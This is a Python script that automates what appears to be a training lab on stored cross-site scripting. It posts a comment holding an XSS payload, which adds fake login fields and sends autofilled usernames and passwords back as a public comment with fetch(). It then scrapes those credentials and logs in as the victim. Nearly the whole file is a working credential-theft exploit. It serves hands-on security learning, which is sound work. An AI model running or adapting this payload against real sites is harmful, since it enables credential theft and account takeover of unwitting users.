import argparse
from bs4 import BeautifulSoup
import requests
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, post_url, proxies=None):
    try:
        print(f"Getting CSRF token from: {post_url}")
        response = session.get(post_url, proxies=proxies, verify=False, timeout=30)
        
        if response.status_code != 200:
            print("Failed to get post page")
            return None
            
        bs = BeautifulSoup(response.text, 'html.parser')
        csrf_token = None
        
        csrf_input = bs.find('input', {'name': 'csrf'})
        if (csrf_input and csrf_input.get('value')):
            csrf_token = csrf_input['value']
    
        if csrf_token:
            print(f"Found CSRF token: {csrf_token}")
            return csrf_token
            
        print("CSRF token not found in the page")
        return None
            
    except requests.exceptions.RequestException as e:
        print(f"Error getting CSRF token: {e}")
        return None


def xss_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        blog_url = urljoin(url, 'post?postId=1')
        comment_url = urljoin(url, 'post/comment')
        login_url = urljoin(url, 'login')
        
        session = requests.Session()
        csrf_token = get_csrf_token(session, blog_url, proxies)
        if not csrf_token:
            print("Failed to get CSRF token")
            return False, None
            
        create_comment(url, proxies, csrf_token, session, comment_url)
        username,password = extract_user_credentials(blog_url, proxies, session)
        csrf_token = get_csrf_token(session, login_url, proxies)
        login(login_url, username, password, proxies, csrf_token,session)
        return is_solved(url, proxies)

    except requests.exceptions.RequestException as e:
        print(f"Error during XSS test: {e}")
        return False, None

def create_comment(url, proxies, csrf_token, session, post_url):    
    print("Creating comment with XSS payload")
    
    base_url = url.rstrip('/')
    
    comment = f'''
        <input name="username" id="username">
        <input type="password" name="password" onchange="credentials()">

        <script>
            function credentials() {{
                let csrf_token = document.getElementsByName("csrf")[0].value;
                let username = document.getElementsByName("username")[0].value;
                let password = document.getElementsByName("password")[0].value;
                
            
                let data = new FormData();
                data.append('postId', '1');
                data.append('csrf', csrf_token);
                data.append('comment', "Username:"+username+" Password:"+password);
                data.append('name', 'kurabiye');
                data.append('email', 'asd@asd.com');
                data.append('website', 'https://www.google.com');
                
                fetch('{base_url}/post/comment', {{
                    method: 'POST',
                    mode: 'no-cors',
                    body: data
                }});
            }}
        </script>
    '''

    payload = {
        "postId": "1",
        "csrf": csrf_token,
        "comment": comment,
        "name": "kurabiye",
        "email": "kurabiye@gmail.com",
        "website": "https://www.google.com"
    } 
    
    print(f"Sending XSS payload: {payload}")
    print(f"Posting comment to: {post_url}")
    response = session.post(post_url, data=payload, proxies=proxies, verify=False, timeout=30)
    
    if response.status_code == 200 and "thank you for your comment!" in response.text.lower():
        print("The comment sent successfully")
    else:
        print(f"The comment could not sent, status code: {response.status_code}")
        return False, response

def extract_user_credentials(blog_url, proxies, session):
    response = session.get(blog_url, proxies=proxies, verify=False, timeout=30)
    if response.status_code != 200:
        print("Failed to get post page")
        return None
        
    print("Extracting user credentials from the page")
    soup = BeautifulSoup(response.text, 'html.parser')
    
    p_tags = soup.find_all("p")
    for p in p_tags:
        text = p.get_text()
        if "Username:" in text and "Password:" in text:
            print("User credentials found:", text)
            username = text.split("Username:")[1].split("Password:")[0].strip()
            password = text.split("Password:")[1].strip()
            print(f"Username: {username}")
            print(f"Password: {password}")
            return username,password
    else:
        print("No user data found in the page")
    
    return None


def login(url, username, password, proxies, csrf_token,session):
    print("Logging in with extracted user credentials")
    
    login_data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    
    response = session.post(
        url,
        data=login_data,
        proxies=proxies,
        verify=False,
        timeout=30
    )
    
    soup = BeautifulSoup(response.text, 'html.parser')
    if "Invalid username or password" in soup.get_text().lower():
        print("Invalid credentials")
    elif "log out" in soup.get_text().lower():
        print("Logged in successfully")
    

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
        return "congratulations" in response.text.lower(), response
    except:
        return False, None

def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 23')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting XSS Test...")
    print(f"Target URL: {args.url}")
    
    success, response = xss_test(args.url, args.proxy)
    if success:
        print("XSS Lab completed successfully!")
    else:
        print("XSS Lab failed.")
        if response:
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()
